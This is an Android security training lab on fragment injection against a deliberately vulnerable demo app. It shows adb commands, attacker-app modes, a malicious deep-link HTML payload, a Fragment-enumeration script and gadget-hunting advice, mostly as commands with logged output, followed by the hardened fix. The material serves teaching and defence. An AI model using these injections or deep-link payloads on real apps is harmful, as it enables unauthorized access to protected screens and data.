# Lab 03 — Beyond `PreferenceActivity`

> **Difficulty:** Intermediate–Advanced
> **Time:** 90–120 minutes
> **You will need:** a device or emulator you own, `adb`, the apps from
> [`../examples/`](../examples/build.sh), and Python 3 on the host.
> **Prerequisite:** [Lab 01](lab-01-land-the-injection.md). [Lab 02](lab-02-is-it-still-exploitable.md)
> is helpful but not required.

---

## Why this lab exists

Every write-up of fragment injection is a write-up of `PreferenceActivity`, and that framing has done
real damage. Teams grep for `extends PreferenceActivity`, find nothing, and close the ticket. The
class is dead in modern code — deprecated at API 29, replaced by `androidx.preference`, and absent
from anything written in the last five years.

**The bug is not `PreferenceActivity`. The bug is a type name crossing a trust boundary.**
`PreferenceActivity` was the first place the platform shipped that pattern for you.

This lab is about the shape you will actually meet: one exported Activity, a single-Activity
architecture, and a router keyed on an extra called `screen`, `page`, `route` or `fragment`. You will
reach it three ways, drive it with attacker-chosen arguments, and measure something about the
reflective loaders that decides whether "it casts to Fragment" is a security control.

> Everything here targets `../examples/victim-app/`, on a device you own. See
> [SECURITY.md](../../SECURITY.md) for the handling rules.

---

## Objectives

1. Find the sink in a host that contains no `PreferenceActivity`, by reading the DEX rather than the
   manifest.
2. Exploit it through an Intent extra.
3. Exploit the **same sink** through a browsable deep link, and explain why that is a different
   severity rather than the same finding twice.
4. Drive the injected Fragment with an attacker-built arguments `Bundle`.
5. Measure the type-check ordering of the two mainstream loaders, and say what it means for gadget
   hunting.
6. Compare the vulnerable host with the key-map host at the level of code, not behaviour.

---

## Part 1 — Find the sink without the manifest

### Step 1.1 — Confirm the manifest is useless here

```bash
# host
cd ../examples && ./build.sh --install
adb shell am start -S -n com.pentest.ch31.attacker/.InjectActivity --es attack probe
adb logcat -d -s CH31ATK
```

```
I CH31ATK: EXPORTED  com.pentest.ch31.victim.FragmentHostActivity
I CH31ATK: EXPORTED  com.pentest.ch31.victim.FragmentHostHardened
```

Two exported Activities with almost the same name. One is a vulnerability and one is the fix, and
**nothing in the manifest distinguishes them**. This is the whole argument of
[README §6.5](../README.md), reproduced in two lines.

### Step 1.2 — Pull the APK and scan it

```bash
# host
adb shell pm path com.pentest.ch31.victim
adb pull <the path it printed> /tmp/ch31-victim.apk
cd /path/to/31-Fragments/scripts
python3 -B fragment-injection-scan.py /tmp/ch31-victim.apk --verbose
```

```
victim-app.apk                                             tier 1  dex=1(0S/1D)
   TIER 1  external input reaches a Fragment loader in one method:
      Lcom/pentest/ch31/victim/FragmentHostActivity;->onCreate
         sources: Landroid/content/Intent;->getBundleExtra, Landroid/content/Intent;->getData,
                  Landroid/content/Intent;->getStringExtra, Landroid/net/Uri;->getQueryParameter
         sinks  : Landroid/app/Fragment;->instantiate
```

Read what the tool did. It did not grep for a string. It parsed the DEX class definitions, walked the
instruction stream of every method, resolved every `invoke-*` to a `(class, method)` pair, and found
**one method** that contains both a read of external input and a reflective Fragment loader. That
per-method co-occurrence is the bug shape; a per-file grep cannot express it.

Note the four sources. `getStringExtra` **and** `getData` **and** `getQueryParameter` — the same sink
is reachable by two roads, which is part 3.

### Step 1.3 — Do it by hand, so you know what the tool did

```bash
# host
mkdir -p /tmp/ch31-smali && cd /tmp/ch31-smali
python3 -B -c "
import zipfile; z=zipfile.ZipFile('/tmp/ch31-victim.apk')
open('classes.dex','wb').write(z.read('classes.dex'))"
java -cp /path/to/apktool.jar com.android.tools.smali.baksmali.Main d classes.dex -o out/
grep -rn "Landroid/app/Fragment;->instantiate" out/
grep -rn "getStringExtra" out/ | head
```

> **Warning**
> `jadx 1.5.3` on this machine **produces no output for a bare `classes.dex`, exits 0, and hangs on a
> `.jar`**. Use `baksmali`, which ships inside `apktool`'s jar. This is a measured property of the
> tooling here, not a general claim about jadx.

You are looking for a method that contains both greps. In a real app you will get many hits for
`getStringExtra` and few for the loader, so start from the loader and work backwards.

---

## Part 2 — Exploit it through an extra

```bash
# host
adb shell am force-stop com.pentest.ch31.victim
adb logcat -c
adb shell am start -S -n com.pentest.ch31.attacker/.InjectActivity --es attack host-inject
sleep 3
adb logcat -d -s CH31 CH31ATK
```

```
I CH31ATK: === host-inject ===
I CH31ATK: started com.pentest.ch31.victim.FragmentHostActivity
I CH31ATK:   fragment = com.pentest.ch31.victim.AdminFragment
I CH31   : FragmentHostActivity.onCreate name=com.pentest.ch31.victim.AdminFragment mode=null
W CH31   : ADMIN-FRAGMENT-REACHED secret=CH31{fragment_injection_skipped_the_login_screen}
```

Identical outcome to lab 01, through a completely different mechanism. There is no `PreferenceActivity`
in this path, no `:android:show_fragment`, and no `isValidFragment`. Read
`../examples/victim-app/FragmentHostActivity.java` — the whole sink is three lines:

```java
String name = getIntent().getStringExtra("fragment");
Bundle args = getIntent().getBundleExtra("args");
Fragment f = Fragment.instantiate(this, name, args);
```

> **Mental Model**
> If you had been told "this app does not use `PreferenceActivity`", you would have been told the
> truth and learned nothing. **Ask what the app does with its extras, not what it extends.**

---

## Part 3 — The same sink, through the web

### Step 3.1 — Fire the deep link

```bash
# host
adb shell am force-stop com.pentest.ch31.victim
adb logcat -c
adb shell am start -S -n com.pentest.ch31.attacker/.InjectActivity --es attack host-deeplink
sleep 3
adb logcat -d -s CH31 CH31ATK
```

```
I CH31ATK: started deep link ch31victim://screen/open?f=com.pentest.ch31.victim.AdminFragment
I CH31   : FragmentHostActivity: name came from the deep link: ch31victim://screen/open?f=...
I CH31   : FragmentHostActivity.onCreate name=com.pentest.ch31.victim.AdminFragment mode=null
W CH31   : ADMIN-FRAGMENT-REACHED secret=CH31{fragment_injection_skipped_the_login_screen}
```

### Step 3.2 — Confirm it is genuinely browsable

The manifest declares `CATEGORY_BROWSABLE` on that filter, which is what lets a browser dispatch it.
Check the platform's own view:

```bash
# host
adb shell "cmd package query-activities --brief -a android.intent.action.VIEW -d 'ch31victim://screen/open'"
```

You should see `com.pentest.ch31.victim/.FragmentHostActivity` in the resolution.

You can also drive it from a real browser, which is the honest version of the test:

```bash
# host -- serve one line of HTML and open it on the device
printf '<a href="ch31victim://screen/open?f=com.pentest.ch31.victim.AdminFragment">tap</a>' > /tmp/x.html
python3 -B -m http.server 8000 --directory /tmp &
adb reverse tcp:8000 tcp:8000
adb shell am start -a android.intent.action.VIEW -d http://localhost:8000/x.html
# tap the link on the device
adb reverse --remove tcp:8000
```

### Step 3.3 — Why this is a different finding

Write down the preconditions of the two runs before reading on:

| | Extra (part 2) | Deep link (part 3) |
|---|---|---|
| Attacker needs an app installed | **yes** | **no** |
| Attacker needs a permission | no | no |
| User interaction | none | must visit a page and tap |
| Distribution | sideload or store | any web page, ad, QR code, message |

The second has **no installation precondition at all**. A triager reading "requires a malicious app
to be installed" will rate the whole finding lower and be right to, so a report that merges the two
loses the more severe half. [26 §3.11](../../26-Intent/README.md) owns deep-link verification and is
where you check `autoVerify` and whether the scheme is claimed by anyone else.

---

## Part 4 — Drive it with arguments

Reaching a screen is one thing. Controlling what it does is another.

```bash
# host
adb shell am force-stop com.pentest.ch31.victim
adb logcat -c
adb shell am start -S -n com.pentest.ch31.attacker/.InjectActivity --es attack args
sleep 3
adb logcat -d -s CH31 CH31ATK
```

```
I CH31ATK: started com.pentest.ch31.victim.SettingsActivity with an attacker built arguments Bundle
I CH31ATK:   keys: [accountId, note, skipAuth]
I CH31   : isValidFragment(com.pentest.ch31.victim.AdminFragment) -> true (VULNERABLE)
W CH31   : ADMIN-FRAGMENT-REACHED secret=CH31{fragment_injection_skipped_the_login_screen}
W CH31   : ADMIN-FRAGMENT-ARGS keys=[accountId, note, skipAuth]
W CH31   : ADMIN-FRAGMENT-NOTE attacker-supplied argument
```

The `Bundle` the attacker built arrived intact in the injected Fragment's `getArguments()`.

**Why this matters more than it looks.** A Fragment's arguments have always come from the app's own
code — `setArguments()` even throws if you call it after the Fragment is attached, so developers set
them exactly once, at construction, and thereafter treat them as trusted immutable input. Nothing in
the API tells a Fragment that its arguments came from a stranger.

Go and read `../examples/victim-app/AdminFragment.java`. It does not validate anything. That is not
sloppiness; it is how Fragments are written.

Then look for these in a real app, in this order ([README §5.5](../README.md)):

| Pattern | Why |
|---|---|
| `args.getBoolean("skipAuth" / "isAdmin" / "debug")` | an authorisation decision made from a stranger's value |
| `args.getString("url")` into a `WebView` | [43-WebView](../../43-WebView/README.md)'s whole subject, reached through a Fragment |
| `args.getInt("accountId")` used to fetch | horizontal privilege escalation |
| `args.getParcelable("config")` without the API 33 `Class` overload | arbitrary `Parcelable`; [24 §3.18](../../24-IPC/README.md) |
| `args.getString("title")` in a `DialogFragment` | phishing text inside the victim's own window |

> **Under the Hood**
> If you instrument this yourself, do not log `bundle.keySet()` directly. It returns an
> `android.util.MapCollections$KeySet` whose `toString()` is `Object`'s, so you get
> `android.util.MapCollections$KeySet@1325cbe1` and no information. Wrap it:
> `new ArrayList<>(b.keySet())`. This cost a re-run while writing this chapter.

---

## Part 5 — The type check, and when it happens

This is the measurement that decides whether "it casts to `Fragment`, so only Fragments can be
constructed" is true.

`../examples/victim-app/NotAFragment.java` is a class that is **not** a Fragment and that logs from
both its static initialiser and its no-argument constructor. `FragmentHostActivity` will load it two
ways.

### Step 5.1 — The platform loader

```bash
# host
adb shell am force-stop com.pentest.ch31.victim
adb logcat -c
adb shell am start -S -n com.pentest.ch31.attacker/.InjectActivity --es attack type-platform
sleep 3
adb logcat -d -s CH31
```

```
I CH31: FragmentHostActivity.onCreate name=com.pentest.ch31.victim.NotAFragment mode=platform
E CH31: instantiate failed: android.app.Fragment$InstantiationException:
        Trying to instantiate a class com.pentest.ch31.victim.NotAFragment that is not a Fragment
```

**No `NOTAFRAGMENT` lines.** Neither the static initialiser nor the constructor ran. The platform
loader does `Fragment.class.isAssignableFrom(clazz)` at bytecode offset `0x19` and
`Constructor.newInstance` at `0x52` — check first, construct second. You read those offsets yourself
in lab 02 step 1.5.

### Step 5.2 — The AndroidX ordering

```bash
# host
adb shell am force-stop com.pentest.ch31.victim
adb logcat -c
adb shell am start -S -n com.pentest.ch31.attacker/.InjectActivity --es attack type-erasure
sleep 3
adb logcat -d -s CH31
```

```
I CH31: FragmentHostActivity.onCreate name=com.pentest.ch31.victim.NotAFragment mode=erasure
W CH31: NOTAFRAGMENT-CLINIT static initialiser ran
W CH31: NOTAFRAGMENT-CTOR no argument constructor ran
E CH31: instantiate failed: java.lang.ClassCastException:
        com.pentest.ch31.victim.NotAFragment cannot be cast to android.app.Fragment
```

**Both ran, before the type error.** Both runs "failed"; only one of them executed attacker-chosen
code first.

### Step 5.3 — Verify the claim about AndroidX yourself

`mode=erasure` is a hand-written replica of AndroidX's ordering, not AndroidX. Confirm the original,
which takes one command if you have the AAR (Android Studio's Gradle cache has it):

```bash
# host
find ~/.gradle -name 'fragment-*.aar' | head -1
python3 -B -c "
import zipfile,sys
z=zipfile.ZipFile(sys.argv[1]); open('/tmp/axfrag.jar','wb').write(z.read('classes.jar'))
" <that aar>
javap -c -p -classpath /tmp/axfrag.jar androidx.fragment.app.FragmentFactory | sed -n '/loadFragmentClass/,/Exception table/p'
```

```
public static java.lang.Class<? extends androidx.fragment.app.Fragment> loadFragmentClass(...);
  Code:
     2: invokestatic  #9   // Method loadClass:(...)Ljava/lang/Class;
     5: astore_2
     6: aload_2
     7: areturn                                     <-- NO checkcast
  Exception table:
       from    to  target type
           0     7    42   Class java/lang/ClassCastException   <-- guards a range that cannot throw one
```

And in `instantiate`:

```
    18: invokevirtual #26  // Constructor.newInstance
    21: checkcast     #10  // class androidx/fragment/app/Fragment
```

Three facts, all visible in that output:

1. `loadFragmentClass` emits **no `checkcast`** — a cast to a generic type is erased.
2. Its `catch (ClassCastException)` is **dead code**; nothing in `0..7` can throw one.
3. The only `checkcast` is at 21, **after** `newInstance` at 18, and is not covered by any handler in
   that method's exception table.

### Step 5.4 — So what?

The interesting artefact is not the exception. It is **the code that ran before it**.

Hunt in a real app for classes with a public no-argument constructor or a static initialiser that
does something: a crash reporter that starts uploading, a cache that wipes itself, a feature-flag
holder that reloads from disk, a debug helper that opens a socket, an SDK that registers a receiver.
Each of those is a **gadget**, and the search is the same one that Java deserialisation research does
against a library classpath — except that here the classpath is the app.

`fragment-injection-scan.py` will not find gadgets for you. Enumerate candidates with:

```bash
# host -- classes with a static initialiser, in the app's own package
grep -rln '\.method static constructor <clinit>' out/com/pentest/ch31/ | head -20
```

---

## Part 5a — Enumerate the reachable set

A finding that says "an attacker can load any Fragment" is a category. A finding that says "an
attacker can load these fourteen, of which this one renders the card number" is a report. This part
turns one into the other.

Three constraints decide reachability, all measured out of `Fragment.instantiate` in
[README §4.4](../README.md):

1. the app's `ClassLoader` can load the class;
2. `Fragment` is assignable from it;
3. it has a **public, no-argument constructor**.

The third prunes the list more than people expect, because Fragments that take constructor arguments
through a `FragmentFactory` — the modern dependency-injection pattern — are **not reachable**.

```bash
# host -- every Fragment subclass, and whether it has a public no-arg constructor
python3 -B - /path/to/31-Fragments/scripts /tmp/ch31-victim.apk <<'PY'
import importlib.util, os, sys, zipfile

spec = importlib.util.spec_from_file_location(
    "fis", os.path.join(sys.argv[1], "fragment-injection-scan.py"))
fis = importlib.util.module_from_spec(spec); spec.loader.exec_module(fis)

FRAG = {"Landroid/app/Fragment;", "Landroid/app/DialogFragment;",
        "Landroidx/fragment/app/Fragment;", "Landroidx/fragment/app/DialogFragment;"}

z = zipfile.ZipFile(sys.argv[2])
sup, acc, ctors = {}, {}, {}
for n in z.namelist():
    if not (n.startswith("classes") and n.endswith(".dex")):
        continue
    d = fis.Dex(z.read(n))
    for cd in d.class_defs():
        sup[cd["name"]] = cd["super"]
        acc[cd["name"]] = cd["access"]
        for midx, a, off in d.methods_of(cd["data_off"]):
            cls, mname = d.method(midx)
            if mname == "<init>":
                # proto index 0 args is the no-arg constructor; approximate by
                # checking the descriptor recorded in the proto table
                ctors.setdefault(cd["name"], []).append(a)

def is_fragment(c):
    seen = set()
    while c and c not in seen:
        seen.add(c)
        if c in FRAG:
            return True
        c = sup.get(c)
    return False

for c in sorted(sup):
    if not is_fragment(c):
        continue
    public = bool(acc.get(c, 0) & 0x1)
    abstract = bool(acc.get(c, 0) & 0x400)
    flag = "REACHABLE " if (public and not abstract) else "not-loadable"
    print("%-12s %s" % (flag, c))
z.close()
PY
```

Then, for each `REACHABLE` class, answer the only question that decides severity: **what does it
do?** Sort by that, not by count. A useful order:

| Priority | Look for |
|---|---|
| 1 | reads a secret from storage, `KeyStore`, or a `ViewModel` |
| 2 | `extends DialogFragment` — dialogs are where apps put decisions, and they get their own window |
| 3 | hosts a `WebView` ([43-WebView](../../43-WebView/README.md)) |
| 4 | reads `getArguments()` and branches on it (part 4) |
| 5 | everything else — usually informational |

> **Pentester's Note**
> Do this before you write the finding, not after. The difference between "fragment injection
> (High)" and "fragment injection; 3 of 61 Fragments are reachable and all three are static
> about-screens (Low)" is twenty minutes of work, and it is the difference between a report that is
> believed and one that is filtered.

---

## Part 6 — Read the fix

Put the two hosts side by side.

```bash
# host
diff <(sed -n '/onCreate/,/^    }/p' ../examples/victim-app/FragmentHostActivity.java) \
     <(sed -n '/onCreate/,/^    }/p' ../examples/victim-app/FragmentHostHardened.java) | head -40
```

The vulnerable one:

```java
String name = getIntent().getStringExtra("fragment");
Fragment f = Fragment.instantiate(this, name, args);
```

The hardened one:

```java
String screen = getIntent().getStringExtra("screen");
Fragment f = create(screen);          // a switch over "about", and nothing else
```

Then fire the attack at it:

```bash
# host
adb shell am start -S -n com.pentest.ch31.attacker/.InjectActivity --es attack host-hardened
adb logcat -d -s CH31
```

```
W CH31: FragmentHostHardened: refused screen=com.pentest.ch31.victim.AdminFragment
```

**No reflection remains.** There is no allowlist to keep in step with the package layout, nothing
fails open if somebody adds a Fragment, R8 can prove which Fragments are reachable again, and the
refusal does not crash the host. Contrast with lab 01's control B, where the allowlist worked and the
app died. [README §5.2](../README.md) has the comparison table.

Also notice what `FragmentHostHardened` does with arguments: it **builds them itself** rather than
forwarding the caller's `Bundle`. A forwarded `Bundle` is an attacker's `Bundle`.

---

## Success criteria

- [ ] The scanner's tier 1 output naming `FragmentHostActivity->onCreate`, with its four sources and
      one sink.
- [ ] The same sink located by hand in Smali.
- [ ] Injection through the extra, landing.
- [ ] Injection through the deep link, landing, **plus** the resolution output proving the scheme is
      browsable.
- [ ] A written comparison of the two preconditions and why they are different findings.
- [ ] The arguments `Bundle` arriving in `getArguments()`, with its keys.
- [ ] `type-platform` producing **no** `NOTAFRAGMENT` lines.
- [ ] `type-erasure` producing **both**, followed by `ClassCastException`.
- [ ] The `javap -c` output showing no `checkcast` in `loadFragmentClass` and the `checkcast` after
      `newInstance` in `instantiate`.
- [ ] The hardened host refusing without crashing.

---

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| Scanner reports tier 3 only | You scanned the wrong APK, or an APK from a different build | `adb shell pm path` and pull again |
| `baksmali` class not found | `apktool.jar` path wrong, or a different apktool version | `java -cp apktool.jar` and check the class name inside the jar |
| Deep link does not resolve | Another app claims the scheme, or the filter did not survive a rebuild | `cmd package query-activities -a android.intent.action.VIEW -d ...` |
| `type-erasure` shows no `NOTAFRAGMENT` lines | You sent `mode=platform`, or the build predates `NotAFragment.java` | Rebuild and check the attack name |
| `javap` cannot find the AAR | Gradle cache is elsewhere or absent | Any `fragment-*.aar` from any AndroidX release shows the same shape |
| Arguments arrive empty | `am start --es` cannot build a nested `Bundle`; the attacker app builds it in code | Use the attacker app, not a hand-written `am` command |

---

## Clean up

```bash
# host
cd ../examples && ./build.sh --uninstall
rm -rf /tmp/ch31-smali /tmp/ch31-victim.apk /tmp/axfrag.jar /tmp/x.html
adb reverse --remove-all 2>/dev/null
```

---

## Where to go next

- [Lab 04 — Sweep and adjudicate](lab-04-sweep-and-adjudicate.md): stop testing an app you wrote, and
  find out how often this shape appears in software you did not.
- [README §4.5](../README.md) for the full bytecode account of the ordering measurement.
- [README §5.3](../README.md) for the four allowlists that look like this fix and are not.
